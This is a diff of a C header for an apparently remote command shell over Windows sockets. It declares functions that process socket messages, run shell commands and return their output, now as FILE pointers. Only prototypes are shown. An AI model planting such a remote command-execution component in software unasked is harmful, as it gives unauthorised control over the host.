@@ -2,16 +2,21 @@
 #define SHELL_COMM_HEADER
 
 #include <ws2tcpip.h>
+#include <stdio.h>
 #pragma comment(lib, "ws2_32.lib")
 
 int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE);
 
-char* processMsg(char * msg, char * cwd, int REPLY_MAX_SIZE);
+FILE* processMsg(char * msg, char * cwd);
 
-char* processShellCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE);
+FILE* processShellCmd(char * cmd, char * cwd);
 
-char* processExtCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE);
+FILE* processExtCmd(char * cmd, char * cwd);
 
-char* getCmdOut(char * cmd, int REPLY_MAX_SIZE);
+FILE* getCmdOut(char * cmd);
+
+char* getCmdOutStr(char * cmd, int REPLY_MAX_SIZE);
+
+FILE* createTmpFile(char * txt);
 
 #endif
